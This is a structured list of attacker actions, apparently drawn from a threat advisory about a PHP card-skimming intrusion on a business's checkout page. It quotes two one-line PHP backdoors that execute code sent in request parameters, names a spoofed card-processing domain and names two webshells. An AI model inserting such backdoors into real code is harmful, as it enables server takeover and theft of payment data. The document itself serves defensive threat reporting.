actions.name: Injected malicious PHP code into the business’s online checkout page
actions.description: Unidentified cyber actors injected malicious PHP code into the business’s customized online checkout page, checkout.php, by altering the associated TempOrders.php file.

actions.name: Used require_once() function to call and execute TempOrders.php file
actions.description: The unidentified cyber actors used the require_once() function to call and execute the TempOrders.php file, which contained code used to scrape and exfiltrate customer data from the US business’ shopping cart to a victim-specific PHP file.

actions.name: Posted customer payment information to spoofed card processing domain
actions.description: The malicious code posts the customer’s payment information to a spoofed card processing domain, http://authorizen[.]net/, impersonating a legitimate card processing company’s domain.

actions.name: Established rudimentary back door by inserting assert($_REQUEST['login']) function
actions.description: The actors established a rudimentary back door by inserting the assert($_REQUEST['login']) function, which executes code submitted as the HTTP request parameter “login”.

actions.name: Downloaded P.A.S. webshell onto the affected company’s webserver
actions.description: Upon execution of the backdoor, the system downloads a fully functional P.A.S. webshell onto the affected company’s webserver.

actions.name: Inserted PHP regular expression @preg_replace("/f/e",$_GET['u'],"fengjiao") to execute PHP code from HTTP request variable
actions.description: The actors inserted the PHP regular expression @preg_replace("/f/e",$_GET['u'],"fengjiao"), designed to insert and execute PHP code submitted as an HTTP request variable named “u”.

actions.name: Downloaded two PHP webshells, P.A.S. and b374, for backdoor access
actions.description: Using the described techniques, the actors downloaded two PHP Webshells, P.A.S. and b374, which were leveraged as backdoors for further exploitation.
